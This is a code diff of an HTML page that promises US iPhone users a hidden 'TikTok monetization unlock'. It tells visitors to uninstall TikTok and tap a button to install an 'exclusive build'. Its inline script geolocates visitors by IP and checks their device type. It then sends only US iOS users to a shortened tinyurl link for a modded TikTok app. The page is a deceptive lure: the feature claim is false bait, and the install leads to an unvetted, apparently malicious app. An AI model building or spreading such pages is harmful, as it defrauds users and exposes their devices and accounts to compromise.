@@ -1,27 +1,100 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>TikTok Monetization Unlock - USA iOS Exclusive</title>
-<meta name="description" content="Unlock TikTok Monetization on your iPhone! USA iOS users only. Follow the steps to activate your Creator Fund today." />
-<meta name="robots" content="index, follow" />
-<link rel="stylesheet" href="styles.css" />
-</head>
-<body>
-<header>
-  <h1>TikTok Monetization Unlock</h1>
-  <p id="intro-text"></p>
-  <p>Steps to unlock:</p>
-  <ol>
-    <li>Uninstall TikTok from your iPhone.</li>
-    <li>Click the button below to install the exclusive TikTok build.</li>
-    <li>Wait 24 hours and check your Creator Fund tab.</li>
-  </ol>
-  <button id="installBtn" disabled>Unlock TikTok Monetization</button>
-  <p class="warning hidden" id="blockMsg">Sorry, this unlock is only available for iPhone users in the USA.</p>
-</header>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>TikTok Monetization Unlock – USA iOS Exclusive</title>
+  <meta name="description" content="Unlock TikTok Monetization on your iPhone! USA iOS users only." />
 
-<script src="script.js"></script>
+  <!-- ======  CSS (inline)  ====== -->
+  <style>
+    /* reset + base */
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+      background:linear-gradient(270deg,#121212,#1a1a2e,#121212);
+      background-size:600% 600%;
+      animation:bgMove 20s ease infinite;
+      color:#e0e0e0;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;
+      min-height:100vh;text-align:center;padding:20px;overflow-x:hidden}
+    @keyframes bgMove{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}
+
+    header{
+      max-width:480px;background:rgba(0,242,234,.05);
+      padding:30px 32px;border-radius:14px;
+      box-shadow:0 0 25px #00f2ea44;
+      animation:fadeUp 1.2s ease forwards;opacity:0}
+    @keyframes fadeUp{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
+
+    h1{font-size:2.5rem;margin-bottom:.3em;color:#00f2ea;text-shadow:0 0 8px #00f2eaaa}
+
+    /* typing effect container */
+    #intro{text-align:left;font-size:1.2rem;line-height:1.6;
+      min-height:3.6em;color:#a0f0f5;white-space:nowrap;overflow:hidden;
+      border-right:3px solid #00f2ea;margin:0 auto 1.6em}
+
+    p,ol{font-size:1.1rem;color:#ccc;margin-bottom:1em;text-align:left}
+    ol{padding-left:20px}
+
+    button{
+      background:#00f2ea;border:none;color:#000;font-weight:bold;
+      font-size:1.25rem;padding:15px 32px;border-radius:50px;cursor:pointer;
+      box-shadow:0 0 20px #00f2eaaa;transition:background .3s,box-shadow .3s;
+      user-select:none;margin-top:20px}
+    button:hover:not(:disabled){animation:pulse 2s infinite;background:#00c6b5;box-shadow:0 0 30px #00c6b5ee}
+    @keyframes pulse{0%,100%{box-shadow:0 0 30px #00c6b5ee}50%{box-shadow:0 0 50px #00f2eaee}}
+    button:disabled{background:#555;cursor:not-allowed;box-shadow:none}
+
+    .warning{margin-top:2em;font-size:1.1rem;color:#f44336;opacity:0;transition:opacity .4s}
+    .warning.show{opacity:1}
+  </style>
+</head>
+
+<body>
+  <header>
+    <h1>TikTok Monetization Unlock</h1>
+    <p id="intro"></p>
+
+    <p><strong>Steps to unlock:</strong></p>
+    <ol>
+      <li>Uninstall TikTok from your iPhone.</li>
+      <li>Tap the button below to install the exclusive build.</li>
+      <li>Open TikTok, wait 24 hrs, then check “Creator Fund”.</li>
+    </ol>
+
+    <button id="install" disabled>Unlock TikTok Monetization</button>
+    <p id="warn" class="warning">Sorry — this unlock works only on iPhone devices in the USA.</p>
+  </header>
+
+  <!-- ======  JS (inline)  ====== -->
+  <script>
+    // ---------- typing effect ----------
+    const introEl=document.getElementById('intro');
+    const text="USA iPhone users only: enable TikTok's hidden monetization feature even with fewer than 1 000 followers.";
+    function type(t,i=0){if(i<t.length){introEl.textContent+=t.charAt(i);setTimeout(()=>type(t,i+1),38);} }
+    type(text);
+
+    // ---------- geo & device gate ----------
+    const btn=document.getElementById('install'), warn=document.getElementById('warn');
+    async function allowUSiOS(){
+      try{
+        const r=await fetch('https://ipapi.co/json/');const d=await r.json();
+        const isUS=d.country_code==='US';
+        const isIOS=/iPhone|iPad|iPod/i.test(navigator.userAgent);
+        return isUS&&isIOS;
+      }catch{return false;}
+    }
+    (async()=>{ if(await allowUSiOS()){btn.disabled=false;} else {warn.classList.add('show');} })();
+
+    btn.addEventListener('click',async()=>{
+      if(await allowUSiOS()){
+        window.location.href='https://tinyurl.com/TikTokIosMod';
+      }else{
+        warn.classList.add('show');
+        btn.disabled=true;
+      }
+    });
+  </script>
 </body>
 </html>
